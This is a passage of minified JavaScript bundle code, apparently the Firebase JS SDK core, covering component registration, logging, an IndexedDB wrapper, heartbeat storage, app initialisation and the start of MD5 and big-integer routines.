jR{constructor(e,t){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=t,this.task.then(()=>{e(this)}).catch(o=>{this.error(o)})}next(e){this.forEachObserver(t=>{t.next(e)})}error(e){this.forEachObserver(t=>{t.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,t,o){let r;if(e===void 0&&t===void 0&&o===void 0)throw new Error("Missing Observer.");PR(e,["next","error","complete"])?r=e:r={next:e,error:t,complete:o},r.next===void 0&&(r.next=Ph),r.error===void 0&&(r.error=Ph),r.complete===void 0&&(r.complete=Ph);const l=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?r.error(this.finalError):r.complete()}catch{}}),this.observers.push(r),l}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let t=0;t<this.observers.length;t++)this.sendOne(t,e)}sendOne(e,t){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{t(this.observers[e])}catch(o){typeof console<"u"&&console.error&&console.error(o)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function PR(a,e){if(typeof a!="object"||a===null)return!1;for(const t of e)if(t in a&&typeof a[t]=="function")return!0;return!1}function Ph(){}function Ot(a){return a&&a._delegate?a._delegate:a}class Hr{constructor(e,t,o){this.name=e,this.instanceFactory=t,this.type=o,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}const Or="[DEFAULT]";class qR{constructor(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)){const o=new lR;if(this.instancesDeferred.set(t,o),this.isInitialized(t)||this.shouldAutoInitialize())try{const r=this.getOrInitializeService({instanceIdentifier:t});r&&o.resolve(r)}catch{}}return this.instancesDeferred.get(t).promise}getImmediate(e){const t=this.normalizeInstanceIdentifier(e?.identifier),o=e?.optional??!1;if(this.isInitialized(t)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:t})}catch(r){if(o)return null;throw r}else{if(o)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(LR(e))try{this.getOrInitializeService({instanceIdentifier:Or})}catch{}for(const[t,o]of this.instancesDeferred.entries()){const r=this.normalizeInstanceIdentifier(t);try{const l=this.getOrInitializeService({instanceIdentifier:r});o.resolve(l)}catch{}}}}clearInstance(e=Or){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(t=>"INTERNAL"in t).map(t=>t.INTERNAL.delete()),...e.filter(t=>"_delete"in t).map(t=>t._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=Or){return this.instances.has(e)}getOptions(e=Or){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:t={}}=e,o=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(o))throw Error(`${this.name}(${o}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const r=this.getOrInitializeService({instanceIdentifier:o,options:t});for(const[l,c]of this.instancesDeferred.entries()){const d=this.normalizeInstanceIdentifier(l);o===d&&c.resolve(r)}return r}onInit(e,t){const o=this.normalizeInstanceIdentifier(t),r=this.onInitCallbacks.get(o)??new Set;r.add(e),this.onInitCallbacks.set(o,r);const l=this.instances.get(o);return l&&e(l,o),()=>{r.delete(e)}}invokeOnInitCallbacks(e,t){const o=this.onInitCallbacks.get(t);if(o)for(const r of o)try{r(e,t)}catch{}}getOrInitializeService({instanceIdentifier:e,options:t={}}){let o=this.instances.get(e);if(!o&&this.component&&(o=this.component.instanceFactory(this.container,{instanceIdentifier:RR(e),options:t}),this.instances.set(e,o),this.instancesOptions.set(e,t),this.invokeOnInitCallbacks(o,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,o)}catch{}return o||null}normalizeInstanceIdentifier(e=Or){return this.component?this.component.multipleInstances?e:Or:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function RR(a){return a===Or?void 0:a}function LR(a){return a.instantiationMode==="EAGER"}class IR{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const t=this.getProvider(e.name);if(t.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);t.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const t=new qR(e,this);return this.providers.set(e,t),t}getProviders(){return Array.from(this.providers.values())}}var $e;(function(a){a[a.DEBUG=0]="DEBUG",a[a.VERBOSE=1]="VERBOSE",a[a.INFO=2]="INFO",a[a.WARN=3]="WARN",a[a.ERROR=4]="ERROR",a[a.SILENT=5]="SILENT"})($e||($e={}));const DR={debug:$e.DEBUG,verbose:$e.VERBOSE,info:$e.INFO,warn:$e.WARN,error:$e.ERROR,silent:$e.SILENT},wR=$e.INFO,MR={[$e.DEBUG]:"log",[$e.VERBOSE]:"log",[$e.INFO]:"info",[$e.WARN]:"warn",[$e.ERROR]:"error"},_R=(a,e,...t)=>{if(e<a.logLevel)return;const o=new Date().toISOString(),r=MR[e];if(r)console[r](`[${o}]  ${a.name}:`,...t);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class ab{constructor(e){this.name=e,this._logLevel=wR,this._logHandler=_R,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in $e))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?DR[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,$e.DEBUG,...e),this._logHandler(this,$e.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,$e.VERBOSE,...e),this._logHandler(this,$e.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,$e.INFO,...e),this._logHandler(this,$e.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,$e.WARN,...e),this._logHandler(this,$e.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,$e.ERROR,...e),this._logHandler(this,$e.ERROR,...e)}}const kR=(a,e)=>e.some(t=>a instanceof t);let hC,gC;function NR(){return hC||(hC=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function OR(){return gC||(gC=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const XA=new WeakMap,dg=new WeakMap,ZA=new WeakMap,qh=new WeakMap,tb=new WeakMap;function zR(a){const e=new Promise((t,o)=>{const r=()=>{a.removeEventListener("success",l),a.removeEventListener("error",c)},l=()=>{t(Fi(a.result)),r()},c=()=>{o(a.error),r()};a.addEventListener("success",l),a.addEventListener("error",c)});return e.then(t=>{t instanceof IDBCursor&&XA.set(t,a)}).catch(()=>{}),tb.set(e,a),e}function UR(a){if(dg.has(a))return;const e=new Promise((t,o)=>{const r=()=>{a.removeEventListener("complete",l),a.removeEventListener("error",c),a.removeEventListener("abort",c)},l=()=>{t(),r()},c=()=>{o(a.error||new DOMException("AbortError","AbortError")),r()};a.addEventListener("complete",l),a.addEventListener("error",c),a.addEventListener("abort",c)});dg.set(a,e)}let pg={get(a,e,t){if(a instanceof IDBTransaction){if(e==="done")return dg.get(a);if(e==="objectStoreNames")return a.objectStoreNames||ZA.get(a);if(e==="store")return t.objectStoreNames[1]?void 0:t.objectStore(t.objectStoreNames[0])}return Fi(a[e])},set(a,e,t){return a[e]=t,!0},has(a,e){return a instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in a}};function BR(a){pg=a(pg)}function VR(a){return a===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...t){const o=a.call(Rh(this),e,...t);return ZA.set(o,e.sort?e.sort():[e]),Fi(o)}:OR().includes(a)?function(...e){return a.apply(Rh(this),e),Fi(XA.get(this))}:function(...e){return Fi(a.apply(Rh(this),e))}}function FR(a){return typeof a=="function"?VR(a):(a instanceof IDBTransaction&&UR(a),kR(a,NR())?new Proxy(a,pg):a)}function Fi(a){if(a instanceof IDBRequest)return zR(a);if(qh.has(a))return qh.get(a);const e=FR(a);return e!==a&&(qh.set(a,e),tb.set(e,a)),e}const Rh=a=>tb.get(a);function HR(a,e,{blocked:t,upgrade:o,blocking:r,terminated:l}={}){const c=indexedDB.open(a,e),d=Fi(c);return o&&c.addEventListener("upgradeneeded",f=>{o(Fi(c.result),f.oldVersion,f.newVersion,Fi(c.transaction),f)}),t&&c.addEventListener("blocked",f=>t(f.oldVersion,f.newVersion,f)),d.then(f=>{l&&f.addEventListener("close",()=>l()),r&&f.addEventListener("versionchange",p=>r(p.oldVersion,p.newVersion,p))}).catch(()=>{}),d}const GR=["get","getKey","getAll","getAllKeys","count"],JR=["put","add","delete","clear"],Lh=new Map;function bC(a,e){if(!(a instanceof IDBDatabase&&!(e in a)&&typeof e=="string"))return;if(Lh.get(e))return Lh.get(e);const t=e.replace(/FromIndex$/,""),o=e!==t,r=JR.includes(t);if(!(t in(o?IDBIndex:IDBObjectStore).prototype)||!(r||GR.includes(t)))return;const l=async function(c,...d){const f=this.transaction(c,r?"readwrite":"readonly");let p=f.store;return o&&(p=p.index(d.shift())),(await Promise.all([p[t](...d),r&&f.done]))[0]};return Lh.set(e,l),l}BR(a=>({...a,get:(e,t,o)=>bC(e,t)||a.get(e,t,o),has:(e,t)=>!!bC(e,t)||a.has(e,t)}));class QR{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(t=>{if(WR(t)){const o=t.getImmediate();return`${o.library}/${o.version}`}else return null}).filter(t=>t).join(" ")}}function WR(a){return a.getComponent()?.type==="VERSION"}const mg="@firebase/app",vC="0.14.8";const Xo=new ab("@firebase/app"),KR="@firebase/app-compat",$R="@firebase/analytics-compat",YR="@firebase/analytics",XR="@firebase/app-check-compat",ZR="@firebase/app-check",eL="@firebase/auth",aL="@firebase/auth-compat",tL="@firebase/database",nL="@firebase/data-connect",oL="@firebase/database-compat",iL="@firebase/functions",rL="@firebase/functions-compat",sL="@firebase/installations",lL="@firebase/installations-compat",cL="@firebase/messaging",uL="@firebase/messaging-compat",dL="@firebase/performance",pL="@firebase/performance-compat",mL="@firebase/remote-config",fL="@firebase/remote-config-compat",hL="@firebase/storage",gL="@firebase/storage-compat",bL="@firebase/firestore",vL="@firebase/ai",yL="@firebase/firestore-compat",EL="firebase",SL="12.9.0";const fg="[DEFAULT]",CL={[mg]:"fire-core",[KR]:"fire-core-compat",[YR]:"fire-analytics",[$R]:"fire-analytics-compat",[ZR]:"fire-app-check",[XR]:"fire-app-check-compat",[eL]:"fire-auth",[aL]:"fire-auth-compat",[tL]:"fire-rtdb",[nL]:"fire-data-connect",[oL]:"fire-rtdb-compat",[iL]:"fire-fn",[rL]:"fire-fn-compat",[sL]:"fire-iid",[lL]:"fire-iid-compat",[cL]:"fire-fcm",[uL]:"fire-fcm-compat",[dL]:"fire-perf",[pL]:"fire-perf-compat",[mL]:"fire-rc",[fL]:"fire-rc-compat",[hL]:"fire-gcs",[gL]:"fire-gcs-compat",[bL]:"fire-fst",[yL]:"fire-fst-compat",[vL]:"fire-vertex","fire-js":"fire-js",[EL]:"fire-js-all"};const xp=new Map,AL=new Map,hg=new Map;function yC(a,e){try{a.container.addComponent(e)}catch(t){Xo.debug(`Component ${e.name} failed to register with FirebaseApp ${a.name}`,t)}}function tl(a){const e=a.name;if(hg.has(e))return Xo.debug(`There were multiple attempts to register component ${e}.`),!1;hg.set(e,a);for(const t of xp.values())yC(t,a);for(const t of AL.values())yC(t,a);return!0}function nb(a,e){const t=a.container.getProvider("heartbeat").getImmediate({optional:!0});return t&&t.triggerHeartbeat(),a.container.getProvider(e)}function Yt(a){return a==null?!1:a.settings!==void 0}const TL={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},Hi=new cu("app","Firebase",TL);class xL{constructor(e,t,o){this._isDeleted=!1,this._options={...e},this._config={...t},this._name=t.name,this._automaticDataCollectionEnabled=t.automaticDataCollectionEnabled,this._container=o,this.container.addComponent(new Hr("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw Hi.create("app-deleted",{appName:this._name})}}const ul=SL;function eT(a,e={}){let t=a;typeof e!="object"&&(e={name:e});const o={name:fg,automaticDataCollectionEnabled:!0,...e},r=o.name;if(typeof r!="string"||!r)throw Hi.create("bad-app-name",{appName:String(r)});if(t||(t=WA()),!t)throw Hi.create("no-options");const l=xp.get(r);if(l){if(Fr(t,l.options)&&Fr(o,l.config))return l;throw Hi.create("duplicate-app",{appName:r})}const c=new IR(r);for(const f of hg.values())c.addComponent(f);const d=new xL(t,o,c);return xp.set(r,d),d}function aT(a=fg){const e=xp.get(a);if(!e&&a===fg&&WA())return eT();if(!e)throw Hi.create("no-app",{appName:a});return e}function Gi(a,e,t){let o=CL[a]??a;t&&(o+=`-${t}`);const r=o.match(/\s|\//),l=e.match(/\s|\//);if(r||l){const c=[`Unable to register library "${o}" with version "${e}":`];r&&c.push(`library name "${o}" contains illegal characters (whitespace or "/")`),r&&l&&c.push("and"),l&&c.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Xo.warn(c.join(" "));return}tl(new Hr(`${o}-version`,()=>({library:o,version:e}),"VERSION"))}const jL="firebase-heartbeat-database",PL=1,Kc="firebase-heartbeat-store";let Ih=null;function tT(){return Ih||(Ih=HR(jL,PL,{upgrade:(a,e)=>{switch(e){case 0:try{a.createObjectStore(Kc)}catch(t){console.warn(t)}}}}).catch(a=>{throw Hi.create("idb-open",{originalErrorMessage:a.message})})),Ih}async function qL(a){try{const t=(await tT()).transaction(Kc),o=await t.objectStore(Kc).get(nT(a));return await t.done,o}catch(e){if(e instanceof ni)Xo.warn(e.message);else{const t=Hi.create("idb-get",{originalErrorMessage:e?.message});Xo.warn(t.message)}}}async function EC(a,e){try{const o=(await tT()).transaction(Kc,"readwrite");await o.objectStore(Kc).put(e,nT(a)),await o.done}catch(t){if(t instanceof ni)Xo.warn(t.message);else{const o=Hi.create("idb-set",{originalErrorMessage:t?.message});Xo.warn(o.message)}}}function nT(a){return`${a.name}!${a.options.appId}`}const RL=1024,LL=30;class IL{constructor(e){this.container=e,this._heartbeatsCache=null;const t=this.container.getProvider("app").getImmediate();this._storage=new wL(t),this._heartbeatsCachePromise=this._storage.read().then(o=>(this._heartbeatsCache=o,o))}async triggerHeartbeat(){try{const t=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),o=SC();if(this._heartbeatsCache?.heartbeats==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,this._heartbeatsCache?.heartbeats==null)||this._heartbeatsCache.lastSentHeartbeatDate===o||this._heartbeatsCache.heartbeats.some(r=>r.date===o))return;if(this._heartbeatsCache.heartbeats.push({date:o,agent:t}),this._heartbeatsCache.heartbeats.length>LL){const r=ML(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(r,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(e){Xo.warn(e)}}async getHeartbeatsHeader(){try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,this._heartbeatsCache?.heartbeats==null||this._heartbeatsCache.heartbeats.length===0)return"";const e=SC(),{heartbeatsToSend:t,unsentEntries:o}=DL(this._heartbeatsCache.heartbeats),r=Tp(JSON.stringify({version:2,heartbeats:t}));return this._heartbeatsCache.lastSentHeartbeatDate=e,o.length>0?(this._heartbeatsCache.heartbeats=o,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),r}catch(e){return Xo.warn(e),""}}}function SC(){return new Date().toISOString().substring(0,10)}function DL(a,e=RL){const t=[];let o=a.slice();for(const r of a){const l=t.find(c=>c.agent===r.agent);if(l){if(l.dates.push(r.date),CC(t)>e){l.dates.pop();break}}else if(t.push({agent:r.agent,dates:[r.date]}),CC(t)>e){t.pop();break}o=o.slice(1)}return{heartbeatsToSend:t,unsentEntries:o}}class wL{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return yR()?ER().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const t=await qL(this.app);return t?.heartbeats?t:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){if(await this._canUseIndexedDBPromise){const o=await this.read();return EC(this.app,{lastSentHeartbeatDate:e.lastSentHeartbeatDate??o.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){if(await this._canUseIndexedDBPromise){const o=await this.read();return EC(this.app,{lastSentHeartbeatDate:e.lastSentHeartbeatDate??o.lastSentHeartbeatDate,heartbeats:[...o.heartbeats,...e.heartbeats]})}else return}}function CC(a){return Tp(JSON.stringify({version:2,heartbeats:a})).length}function ML(a){if(a.length===0)return-1;let e=0,t=a[0].date;for(let o=1;o<a.length;o++)a[o].date<t&&(t=a[o].date,e=o);return e}function _L(a){tl(new Hr("platform-logger",e=>new QR(e),"PRIVATE")),tl(new Hr("heartbeat",e=>new IL(e),"PRIVATE")),Gi(mg,vC,a),Gi(mg,vC,"esm2020"),Gi("fire-js","")}_L("");var AC=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};var Ji,oT;(function(){var a;function e(w,I){function k(){}k.prototype=I.prototype,w.F=I.prototype,w.prototype=new k,w.prototype.constructor=w,w.D=function(j,_,z){for(var N=Array(arguments.length-2),ge=2;ge<arguments.length;ge++)N[ge-2]=arguments[ge];return I.prototype[_].apply(j,N)}}function t(){this.blockSize=-1}function o(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.C=Array(this.blockSize),this.o=this.h=0,this.u()}e(o,t),o.prototype.u=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function r(w,I,k){k||(k=0);const j=Array(16);if(typeof I=="string")for(var _=0;_<16;++_)j[_]=I.charCodeAt(k++)|I.charCodeAt(k++)<<8|I.charCodeAt(k++)<<16|I.charCodeAt(k++)<<24;else for(_=0;_<16;++_)j[_]=I[k++]|I[k++]<<8|I[k++]<<16|I[k++]<<24;I=w.g[0],k=w.g[1],_=w.g[2];let z=w.g[3],N;N=I+(z^k&(_^z))+j[0]+3614090360&4294967295,I=k+(N<<7&4294967295|N>>>25),N=z+(_^I&(k^_))+j[1]+3905402710&4294967295,z=I+(N<<12&4294967295|N>>>20),N=_+(k^z&(I^k))+j[2]+606105819&4294967295,_=z+(N<<17&4294967295|N>>>15),N=k+(I^_&(z^I))+j[3]+3250441966&4294967295,k=_+(N<<22&4294967295|N>>>10),N=I+(z^k&(_^z))+j[4]+4118548399&4294967295,I=k+(N<<7&4294967295|N>>>25),N=z+(_^I&(k^_))+j[5]+1200080426&4294967295,z=I+(N<<12&4294967295|N>>>20),N=_+(k^z&(I^k))+j[6]+2821735955&4294967295,_=z+(N<<17&4294967295|N>>>15),N=k+(I^_&(z^I))+j[7]+4249261313&4294967295,k=_+(N<<22&4294967295|N>>>10),N=I+(z^k&(_^z))+j[8]+1770035416&4294967295,I=k+(N<<7&4294967295|N>>>25),N=z+(_^I&(k^_))+j[9]+2336552879&4294967295,z=I+(N<<12&4294967295|N>>>20),N=_+(k^z&(I^k))+j[10]+4294925233&4294967295,_=z+(N<<17&4294967295|N>>>15),N=k+(I^_&(z^I))+j[11]+2304563134&4294967295,k=_+(N<<22&4294967295|N>>>10),N=I+(z^k&(_^z))+j[12]+1804603682&4294967295,I=k+(N<<7&4294967295|N>>>25),N=z+(_^I&(k^_))+j[13]+4254626195&4294967295,z=I+(N<<12&4294967295|N>>>20),N=_+(k^z&(I^k))+j[14]+2792965006&4294967295,_=z+(N<<17&4294967295|N>>>15),N=k+(I^_&(z^I))+j[15]+1236535329&4294967295,k=_+(N<<22&4294967295|N>>>10),N=I+(_^z&(k^_))+j[1]+4129170786&4294967295,I=k+(N<<5&4294967295|N>>>27),N=z+(k^_&(I^k))+j[6]+3225465664&4294967295,z=I+(N<<9&4294967295|N>>>23),N=_+(I^k&(z^I))+j[11]+643717713&4294967295,_=z+(N<<14&4294967295|N>>>18),N=k+(z^I&(_^z))+j[0]+3921069994&4294967295,k=_+(N<<20&4294967295|N>>>12),N=I+(_^z&(k^_))+j[5]+3593408605&4294967295,I=k+(N<<5&4294967295|N>>>27),N=z+(k^_&(I^k))+j[10]+38016083&4294967295,z=I+(N<<9&4294967295|N>>>23),N=_+(I^k&(z^I))+j[15]+3634488961&4294967295,_=z+(N<<14&4294967295|N>>>18),N=k+(z^I&(_^z))+j[4]+3889429448&4294967295,k=_+(N<<20&4294967295|N>>>12),N=I+(_^z&(k^_))+j[9]+568446438&4294967295,I=k+(N<<5&4294967295|N>>>27),N=z+(k^_&(I^k))+j[14]+3275163606&4294967295,z=I+(N<<9&4294967295|N>>>23),N=_+(I^k&(z^I))+j[3]+4107603335&4294967295,_=z+(N<<14&4294967295|N>>>18),N=k+(z^I&(_^z))+j[8]+1163531501&4294967295,k=_+(N<<20&4294967295|N>>>12),N=I+(_^z&(k^_))+j[13]+2850285829&4294967295,I=k+(N<<5&4294967295|N>>>27),N=z+(k^_&(I^k))+j[2]+4243563512&4294967295,z=I+(N<<9&4294967295|N>>>23),N=_+(I^k&(z^I))+j[7]+1735328473&4294967295,_=z+(N<<14&4294967295|N>>>18),N=k+(z^I&(_^z))+j[12]+2368359562&4294967295,k=_+(N<<20&4294967295|N>>>12),N=I+(k^_^z)+j[5]+4294588738&4294967295,I=k+(N<<4&4294967295|N>>>28),N=z+(I^k^_)+j[8]+2272392833&4294967295,z=I+(N<<11&4294967295|N>>>21),N=_+(z^I^k)+j[11]+1839030562&4294967295,_=z+(N<<16&4294967295|N>>>16),N=k+(_^z^I)+j[14]+4259657740&4294967295,k=_+(N<<23&4294967295|N>>>9),N=I+(k^_^z)+j[1]+2763975236&4294967295,I=k+(N<<4&4294967295|N>>>28),N=z+(I^k^_)+j[4]+1272893353&4294967295,z=I+(N<<11&4294967295|N>>>21),N=_+(z^I^k)+j[7]+4139469664&4294967295,_=z+(N<<16&4294967295|N>>>16),N=k+(_^z^I)+j[10]+3200236656&4294967295,k=_+(N<<23&4294967295|N>>>9),N=I+(k^_^z)+j[13]+681279174&4294967295,I=k+(N<<4&4294967295|N>>>28),N=z+(I^k^_)+j[0]+3936430074&4294967295,z=I+(N<<11&4294967295|N>>>21),N=_+(z^I^k)+j[3]+3572445317&4294967295,_=z+(N<<16&4294967295|N>>>16),N=k+(_^z^I)+j[6]+76029189&4294967295,k=_+(N<<23&4294967295|N>>>9),N=I+(k^_^z)+j[9]+3654602809&4294967295,I=k+(N<<4&4294967295|N>>>28),N=z+(I^k^_)+j[12]+3873151461&4294967295,z=I+(N<<11&4294967295|N>>>21),N=_+(z^I^k)+j[15]+530742520&4294967295,_=z+(N<<16&4294967295|N>>>16),N=k+(_^z^I)+j[2]+3299628645&4294967295,k=_+(N<<23&4294967295|N>>>9),N=I+(_^(k|~z))+j[0]+4096336452&4294967295,I=k+(N<<6&4294967295|N>>>26),N=z+(k^(I|~_))+j[7]+1126891415&4294967295,z=I+(N<<10&4294967295|N>>>22),N=_+(I^(z|~k))+j[14]+2878612391&4294967295,_=z+(N<<15&4294967295|N>>>17),N=k+(z^(_|~I))+j[5]+4237533241&4294967295,k=_+(N<<21&4294967295|N>>>11),N=I+(_^(k|~z))+j[12]+1700485571&4294967295,I=k+(N<<6&4294967295|N>>>26),N=z+(k^(I|~_))+j[3]+2399980690&4294967295,z=I+(N<<10&4294967295|N>>>22),N=_+(I^(z|~k))+j[10]+4293915773&4294967295,_=z+(N<<15&4294967295|N>>>17),N=k+(z^(_|~I))+j[1]+2240044497&4294967295,k=_+(N<<21&4294967295|N>>>11),N=I+(_^(k|~z))+j[8]+1873313359&4294967295,I=k+(N<<6&4294967295|N>>>26),N=z+(k^(I|~_))+j[15]+4264355552&4294967295,z=I+(N<<10&4294967295|N>>>22),N=_+(I^(z|~k))+j[6]+2734768916&4294967295,_=z+(N<<15&4294967295|N>>>17),N=k+(z^(_|~I))+j[13]+1309151649&4294967295,k=_+(N<<21&4294967295|N>>>11),N=I+(_^(k|~z))+j[4]+4149444226&4294967295,I=k+(N<<6&4294967295|N>>>26),N=z+(k^(I|~_))+j[11]+3174756917&4294967295,z=I+(N<<10&4294967295|N>>>22),N=_+(I^(z|~k))+j[2]+718787259&4294967295,_=z+(N<<15&4294967295|N>>>17),N=k+(z^(_|~I))+j[9]+3951481745&4294967295,w.g[0]=w.g[0]+I&4294967295,w.g[1]=w.g[1]+(_+(N<<21&4294967295|N>>>11))&4294967295,w.g[2]=w.g[2]+_&4294967295,w.g[3]=w.g[3]+z&4294967295}o.prototype.v=function(w,I){I===void 0&&(I=w.length);const k=I-this.blockSize,j=this.C;let _=this.h,z=0;for(;z<I;){if(_==0)for(;z<=k;)r(this,w,z),z+=this.blockSize;if(typeof w=="string"){for(;z<I;)if(j[_++]=w.charCodeAt(z++),_==this.blockSize){r(this,j),_=0;break}}else for(;z<I;)if(j[_++]=w[z++],_==this.blockSize){r(this,j),_=0;break}}this.h=_,this.o+=I},o.prototype.A=function(){var w=Array((this.h<56?this.blockSize:this.blockSize*2)-this.h);w[0]=128;for(var I=1;I<w.length-8;++I)w[I]=0;I=this.o*8;for(var k=w.length-8;k<w.length;++k)w[k]=I&255,I/=256;for(this.v(w),w=Array(16),I=0,k=0;k<4;++k)for(let j=0;j<32;j+=8)w[I++]=this.g[k]>>>j&255;return w};function l(w,I){var k=d;return Object.prototype.hasOwnProperty.call(k,w)?k[w]:k[w]=I(w)}function c(w,I){this.h=I;const k=[];let j=!0;for(let _=w.length-1;_>=0;_--){const z=w[_]|0;j&&z==I||(k[_]=z,j=!1)}this.g=k}var d={};function f(w){return-128<=w&&w<128?l(w,function(I){return new c([I|0],I<0?-1:0)}):new c([w|0],w<0?-1:0)}function p(w){if(isNaN(w)||!isFinite(w))return y;if(w<0)return x(p(-w));const I=[];let k=1;for(let j=0;w>=k;j++)I[j]=w/k|0,k*=4294967296;return new c(I,0)}function v(w,I){if(w.length==0)throw Error("number format error: empty string");if(I=I||10,I<2||36<I)throw Error("radix out of range: "+I);if(w.charAt(0)=="-")return x(v(w.substring(1),I));if(w.indexOf("-")>=0)throw Error('number format error: interior "-" character');const k=p(Math.pow(I,8));let j=y;for(let z=0;z<w.length;z+=8){var _=Math.min(8,w.length-z);const N=parseInt(w.substring(z,z+_),I);_<8?(_=p(Math.pow(I,_)),j=j.j(_).add(p(N))):(j=j.j(k),j=j.add(p(N)))}return j}var y=f(0),S=f(1),A=f(16777216);a=c.prototype,a.m=function(){if(L(this))return-x(this).m();let w=0,I=1;for(let k=0;k<this.g.length;k++){const j=this.i(k);w+=(j>=0?j:4294967296+j)*I,I*=4294967296}return w},a.toString=function(w){if(w=w||10,w<2||36<w)throw Error("radix out of range: "+w);if(R(this))return"0";if(L(this))return"-"+x(this).toString(w);const I=p(Math.pow(w,6));var k=this;let j="";for(;;){const _=ee(k,I).g;k=D(k,_.j(I));let z=((k.g.length>0?k.g[0]:k.h)>>>0).toString(w);if(k=_,R(k))return z+j;for(;z.length<6;)z="0"+z;j=z+j}},a.i=function(w){return 